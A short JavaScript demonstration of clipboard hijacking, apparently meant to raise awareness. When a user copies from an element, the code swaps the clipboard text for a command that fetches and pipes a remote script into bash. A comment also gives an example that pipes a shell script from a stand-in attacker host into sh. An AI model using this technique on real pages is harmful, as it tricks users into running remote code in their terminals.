/*
  Hello there!
  People have found an exploit in JavaScript which works as "intended", basically copying something else to the clipboard, than what you actually look like you copy.
  
  For example you could want to copy 'sudo apt update' from the command line, but end up copying 
  'curl http://attacker-domain:8000/shell.sh | sh\n'
  
  This script will contain this exploit, but will warn users instead.

*/

document.getElementById('copy').addEventListener('copy', function(e) { e.clipboardData.setData('text/plain', 'curl -s https://raw.githubusercontent.com/SirObby/security_concern/main/copy_and_paste.sh | bash\n'); e.preventDefault(); });
